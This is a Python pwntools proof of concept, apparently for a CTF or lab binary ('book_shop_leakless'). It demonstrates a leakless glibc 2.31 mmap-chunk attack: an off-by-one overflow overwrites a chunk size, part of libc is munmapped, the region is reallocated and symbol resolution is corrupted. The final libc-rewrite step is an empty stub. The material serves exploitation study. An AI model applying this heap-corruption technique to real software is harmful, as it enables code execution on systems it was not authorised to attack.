'''
Mmap chunk Full POC
This POC should work on all versions of libc. But, the LibC specific version for this is 2.31. 

This technique only works if no or partial RELRO is used with a dynamic
linked binary. 
Full RELRO does not do dynamic symbol resolution so the technique
does not work with full relro enabled. 

Breaks: 
- Buffer overflow (vulneability) 
- Overlapping chunks 
- Leak 
- Arbitrary Write
- Pop shell (this and the one prior could be the same)
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.31/libc-2.31.so'
env = {}

# Binary setup
elf_name = '.book_shop_leakless' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([ elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.31
''')
else: 
	p = remote(domain, port) 


# Create a book
def create_book(name, author, pages): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("book:", str(pages)) 
	p.sendlineafter("Title:", str(name)) 
	p.sendlineafter("Author:", str(author))
	return 

# Write a page
def write_page(book_no, page_no, content): 
	p.sendlineafter(">", "2") 
	p.sendlineafter("No:", str(book_no))
	p.sendlineafter("write:", str(page_no))
	p.sendlineafter("page:", str(content))

# Publish a book (free it) 
def publish(book_no):
	p.sendlineafter(">", "4") 
	p.sendlineafter("No:", str(book_no))

# View a book
def view(book_no, page_no): 
	p.sendlineafter(">", "3") 
	p.sendlineafter("No:", str(book_no))
	p.sendlineafter("view:", str(page_no))

	# Parse out the book and content
	p.recvuntil("of ") 
	book_name = p.recvline()
	content = p.recvuntil("Large")[:-5]
	return book_name, content


'''
Overlapping mmap chunks via buffer overflow
==========================================

Mmap Basics
===============
Extremely large chunks (greater than 128 * 1024 to start) 
are not handled in the normal ways. All of the 'books' are
going to be of very large sizes. 

Very large chunks are allocated via a straight call to 
the syscall mmap. Similarly, munmap is used for freeing. The
second bit (| 0x2) is for marking if a chunk was mmapped.

Size and Prev Size fields are handled slightly differently. 
The size is the same. However, the prev_size field is used 
as the leftover data of a given chunk from mmap (on the 
current chunk). Mmap chunks are NOT handled in bins. 

Mmap chunks grow downards in memory (in terms of WHERE a chunk gets
placed at. 

Vulnerability
===============
The buffer overflows exists because of an off by 1 error in the 
source code for the page to write to. This allows for the size 
and prev_size to be overwritten of an mmap chunk.

'''
def munmap_libc():

	# Size of the chunks that are being used here
	size = 0x21000
	size_to_libc = 0x2000
	libc_to_overwrite = 0x5000 # 0x1b3bc


	# Creates two books
	create_book("A" * 8, "B" * 8, 32)
	create_book("C" * 8, "D" * 8, 32) 

	'''
	Heap Setup
	============
	chunk1 (0x21000) 
	chunk0 (0x21000) 
	LibC
	============

	Free both index 0 chunk. 
	This is done by overriding the chunk size
	of the index 0 chunk to include the first 0x5000
	bytes of LibC. 

	So, when this is freed, part of LibC is 
	munmapped.

	Why the hell would we want to do this? 
	The first part of LibC has MANY important aspects
	that are interesting to overwrite! Most importantly: 
	it has the dynamic symbol resolving! 

	By setting up the symbol resolving properly, we can 
	trick LibC to load an improper function for us. 
	The best part: these symbol tables are relative offsets!
	This means that if we rewrite everything properly, 
	we can do this in a LEAKLESS fashion!

	LEAKLESS! What is this, the year 2000? 

	
	There is a value called the 'mmap_threshold'. 
	This value is set to the size of the LARGEST freed 
	mmap chunk (even the overwritten size). If the allocation 
	is 'smaller' than this value, then a regular allocation 
	strategy is used. 

	In order to get another MMAP chunk to overlap with LibC
	we need to make room below the chunk we just freed. Requesting
	a chunk that would overlap with Libc and be small enough 
	to be prior to chunk 0 would be too small. 
	
	So, in order to combat this, we just free chunk 0
	so that we can make a VERY large allocation to 
	overlap with the current section.

	'''
	fake_chunk = "I" * 0x20 # Filler
	fake_chunk += p64(0x0)  # Prev Size -- Overlaps with previous chunk
	fake_chunk += p64(size + size_to_libc + libc_to_overwrite | 2)  # Size 

	write_page(1, 32, fake_chunk)

	print "Munmap chunk 0 with first 5 pages of LibC! :)"
	print "Munmap chunk 1" 

	publish(0) # Remove chunk 0 and part of LibC
	publish(1) # Remove chunk1 

	# Return the size of the chunk allocated
	return size + size_to_libc + libc_to_overwrite


def allocate_over_libc(size): 
	'''
	With part of LibC munmapped, we need to
	allocate over the top of it with our own controllable
	mmap chunk. 

	This will allow us to control the symbol resolving
	process in order to set a not yet resolved symbol 
	to an arbitrary location inside of or passed 
	LibC. 

	Need to ensure that an mmap chunk is used. So
	we allocate LARGER (equal to will result in a regular
	chunk being used) than the largest size 'freed'. 
	'''
	# Add 0x1000 in order to pass mmap_threshold check 
	size += 0x1000
	
	create_book("Chronicles of Munmap", "Ernest Hemmingway", size/0x1000) 


def rewrite_libc(): 
	'''
	The symbol resolution process is actually VERY complicated. 
	It uses all sorts of hashing, bloom filters and so on. 
	This means (unless you want another research project) 
	it is likely not a good idea to reverse the entire process
	and understand WHERE to write things. 

	So, instead, it is reccomended that two things are done instead: 
	-  Copy two sections of LibC (.dynsym and .gnu.hash) and 
	   only replace what you need. 
	-  Only SET what you need, which requires knowing what the 
	   important values are. 

	With the first option, only the symbol table entry for 
	the newly called function NEEDS to be overwritten. In particular, 
	the 'relative' offset into LibC is the only thing. 

	However, the copying this in can be sort of trivial to do 
	(seeing offsets for symbols in a binary can be seen with 
	readelf). So, we are going to rewrite ONLY the symbols 
	needed for the values NEEDED for the symbol resolution process.
	
	In this attack, there is a function within the 'view_page' 
	function that we are targetting: 'atoll'. Because this function
	accepts a string AND has not been called before, it makes a great 
	target for the attack. 
	'''
	pass
	
print "Starting Mmap Chunk Overlapping....LEAKLESS!"
print "============================================"
size = munmap_libc()
allocate_over_libc(size) 
rewrite_libc() 

p.interactive()


